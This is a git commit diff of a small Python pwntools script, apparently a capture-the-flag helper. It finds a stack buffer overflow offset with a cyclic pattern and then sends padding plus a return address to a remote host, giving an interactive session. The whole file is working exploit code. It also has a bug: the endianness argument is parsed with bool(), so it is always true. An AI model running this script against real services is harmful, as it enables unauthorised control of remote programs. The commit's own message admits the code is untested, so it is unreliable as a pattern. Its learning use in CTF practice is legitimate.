c9f9a386e7e435bbdf1237be268d5bd77397aedd
Sean Lim <seanlimwr09@gmail.com>
2023-03-23 21:24:52 +0800

    made it use arguments
    probably works idk

--- script.py
+++ script.py
@@ -1,28 +1,38 @@
+#!/usr/bin/env python3
 from pwn import *
+import sys
 
-# modify the variables below here
-host = "insert.host.here"
-port = 1234
-address = 0xdeadbeef
-littleEndian = True
-binaryName = "./vuln"
-# modify the variables above here
+def main():
+    if len(sys.argv) != 6:
+        print("Need 5 arguments")
+    else:
+        host = str(sys.argv[1])
+        port = int(sys.argv[2])
+        address = int(sys.argv[3], 16)
+        littleEndian = bool(sys.argv[4])
+        binaryName = str(sys.argv[5])
 
-elf = ELF(binaryName)
-p = process(binaryName)
-p.sendline(cyclic(200, n=8))
-p.wait()
 
-core = p.corefile
-offset = cyclic_find(core.read(core.rsp, 8), n=8)
 
-print(f"The offset is {offset}")
+        elf = ELF(binaryName)
+        p = process(binaryName)
+        p.sendline(cyclic(200, n=8))
+        p.wait()
 
-conn = remote(host, port)
-if littleEndian == True:
-    conn.sendline(b"A"*offset+p64(address))
-else:
-    context.endian = 'big'
-    conn.sendline(b"A"*offset+p64(address))
+        core = p.corefile
+        offset = int(cyclic_find(core.read(core.rsp, 8), n=8))
 
-conn.interactive()
+        print(f"The offset is {offset}")
+
+        conn = remote(host, port)
+        if littleEndian == True:
+            conn.sendline(b"A"*offset+p64(address))
+        else:
+            context.endian = 'big'
+            conn.sendline(b"A"*offset+p64(address))
+
+        conn.interactive()
+
+
+if __name__ == "__main__":
+    main()
